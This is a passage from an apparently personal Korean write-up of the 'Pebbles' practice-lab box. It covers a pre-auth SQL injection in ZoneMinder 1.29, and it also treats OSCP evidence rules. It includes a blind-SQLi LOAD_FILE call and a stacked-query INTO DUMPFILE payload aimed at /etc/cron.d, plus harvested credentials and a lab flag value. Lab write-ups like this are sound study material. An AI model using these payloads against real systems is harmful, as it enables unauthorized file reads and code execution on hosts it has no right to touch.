echo "[*] proof.txt:"; python3 blind.py "(SELECT LOAD_FILE(0x2f7661722f6c69622f6d7973716c2f702e747874))"
```
— 출처: `~/PG/Pebbles/pebbles_pwn.sh` (**미실행**)

> [!danger] 이 초안은 시험에 그대로 못 씀 — 파일 쓰기를 sqlmap 에 맡김
> `--file-write`/`--file-dest` 는 sqlmap 기능이고 sqlmap 은 OSCP 전면 금지임. 수동 대안은 같은 스택 쿼리로 직접 쓰는 것 —
> ```text
> 1;SELECT 0x3c63726f6e20696e746572...  INTO DUMPFILE '/etc/cron.d/pebbles'#
> ```
> 파일 내용을 hex 리터럴로 감싸 `INTO DUMPFILE` 에 넘김(따옴표·개행 이스케이프 문제를 통째로 우회 — [[Squid]] 와 같은 패턴). `INTO OUTFILE` 은 개행·탭을 이스케이프하므로 **바이너리나 정확한 개행이 필요하면 `DUMPFILE`** 을 씀.
> ⚠️ 이 hex 페이로드는 **이 박스에서 실행된 적이 없음** — 위 스크립트의 sqlmap 호출을 수동으로 옮긴 형태이고 문법 예시임 `[가정]`.

**남은 lead (전부 미시도, `[가정]`):** mysqld 구동 계정 확인(`SELECT @@basedir`·`SELECT USER()`·`LOAD_FILE('/proc/self/status')`) → root 면 UDF 가 곧 root RCE. `zmuser:zmpass` 를 SSH·`su` 에 재사용 → 시도 기록 없음.

### Post-Exploitation

**Proof.txt value:**
`c3d4b2020d3ff9d4eefa8e6f89e6e67b`

> [!danger] ⚠️ 증거 형식 — 이 획득 경로는 OSCP 에서 0점임
> 값의 출처는 `~/PG/Pebbles/proof.out` 이고 그것은 **`blind.py` 의 SQLi 추출 출력**임. 대화형 셸에서 `cat` 한 화면이 아님.
> OSCP 규정은 *"this includes any type of web-based shell"* — 웹/DB 채널로 읽은 플래그는 인정되지 않음. 시험 상황이었다면 **UDF 로 셸을 마저 잡아 `whoami; id; hostname; hostname -I; date; cat /root/proof.txt` 를 한 화면에 담아야** 점수가 됨([[_PLAYBOOK#C-3. 플래그·증거]]).
> **「플래그 값을 아는 것」과 「시험 규격 증거」는 다름.** 이 박스는 앞을 했고 뒤를 안 했음.

**타겟 pty 프롬프트 없음.** 이 박스에서 대화형 셸을 잡은 적이 없으므로 캡처할 프롬프트가 존재하지 않음. `~/.zsh_history` 에도 Pebbles 관련 명령이 **0건**임 — 모든 Kali 작업이 비대화형 `ssh kali "…"` 로 돌았음.

**스크린샷 없음.** 볼트 `파일보관\` 에 `PG-Pebbles-*` 가 없고 2026-08-20 자 `Pasted image …` 도 0장임. 박스가 정지돼 소급 촬영 불가.

**남긴 흔적**

- **타겟** — `blind.py` 가 던진 수백 건의 SQL 이 ZoneMinder `Logs` 테이블에 남음. 산출물에 남은 페이로드는 **전부 읽기**(`SELECT`·`LOAD_FILE`)이고 `INTO OUTFILE`·`INTO DUMPFILE`·UDF·계정 생성을 실행한 기록은 없음. ⚠️ 다만 `blind.py` 가 argv 를 기록하지 않으므로 **「쓰기를 한 번도 안 했다」를 산출물로 증명할 수는 없음** — 아래 SSH 공개키 항목과 함께 `[가정]`
- **SSH 공개키** — `peb_key.pub`(`ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINTYCloFJOUix+ud0FX97EDOq4aQGD+0rzY//XtS2IJK kali@kali`)를 Kali 에서 생성함(10:57). ⚠️ **타겟 `authorized_keys` 에 심었다는 산출물이 없음** — 심겼는지 여부는 `[가정]`·확인 불가. 심겼다면 그것이 이 박스에 남긴 유일한 파일 변경임
- **획득 자격증명** — MySQL `zmuser:zmpass` · ZoneMinder `admin:admin`(해시 `*4ACFE…9441`)
- **Kali** — 리스너·tmux 세션 없음(리버스셸을 쓴 적이 없어 아웃바운드 포트 문제 자체가 발생하지 않음). NFS 마운트 없음. 산출물 `~/PG/Pebbles/` 22개 보존

## 관련

- MySQL `LOAD_FILE` / `secure_file_priv`: <https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file>
- `mysqli_multi_query` 다중문: <https://www.php.net/manual/en/mysqli.multi-query.php>
- time-based blind SQLi 개념: OWASP "Blind SQL Injection"
- MySQL UDF RCE(`lib_mysqludf_sys` 의 `sys_exec`) — 이 박스에서는 미시도. 개념만 `Privilege Escalation` 절 참조
- ZoneMinder `limit` SQL Injection — `[가정]` EDB "ZoneMinder 1.29/1.30 - Multiple SQL Injections" 계열. **CVE 번호는 확정하지 못함**(타겟 정지로 재확인 불가) → `cves` 를 비우고 `manual_cves: true` 로 고정
- [[Cobbles]] — **자매 ZoneMinder 박스.** 같은 `OPT_USE_AUTH` off 무인증 진입이나 **버전과 RCE 경로가 다름**: Pebbles 는 **1.29.0** + `limit` 파라미터 pre-auth SQLi(코드 실행 없음), Cobbles 는 **1.34.23** + Filter `AutoExecuteCmd` 명령 실행(PHP7 느슨비교 타입저글링 우회)
- [[Hawat]] — SQLi + blind + `INTO OUTFILE`. **JDBC 라 스택 쿼리(`;`)가 기본 차단된** 정반대 사례. 이 노트의 스택 쿼리 판정과 짝으로 읽을 것
- [[Squid]] — `INTO DUMPFILE` + hex 리터럴로 바이너리 쓰기. UDF `.so` 주입과 같은 패턴
- [[Hub]] — 서비스가 root 로 구동돼 그대로 권한상승이 되는 패턴. 여기서 미시도로 남긴 「mysqld 구동 계정 확인」의 짝
- [[Robust]] — 수동 UNION SQLi 로 엔진(SQLite)을 지문 판정한 사례. 채널이 UNION 으로 열린 반대 경우
- [[Crane]] · [[Astronaut]] · [[Exghost]] — 「응답이 성공을 뜻하지 않는다」. 여기서는 **「배너가 정체를 뜻하지 않는다」**(8080 Tomcat 미끼)로 확장됨
- [[_PLAYBOOK#B-12. SQLi 수동 UNION — sqlmap 금지 대비]] · [[_PLAYBOOK#B-1-10. ZoneMinder 무인증 콘솔 + Filter AutoExecuteCmd RCE]] · [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] · [[_PLAYBOOK#A-17. 부가 포트가 기본 페이지·403 만 뱉는다]] · [[_PLAYBOOK#C-3. 플래그·증거]]
- [[_PLAYBOOK#A-2-16. 디렉터리 리스팅에 파일명은 보이는데 내용이 안 보인다]] · [[_PLAYBOOK#A-2-17. SQLi 는 찾았는데 데이터가 안 나온다]] · [[_PLAYBOOK#A-67. blind 추출 결과를 믿기 전에 «완주했는가»부터 본다]]
- [[_PLAYBOOK#B-1-25. time-based blind SQLi 를 손으로 짠다 — sqlmap 금지 대비]]
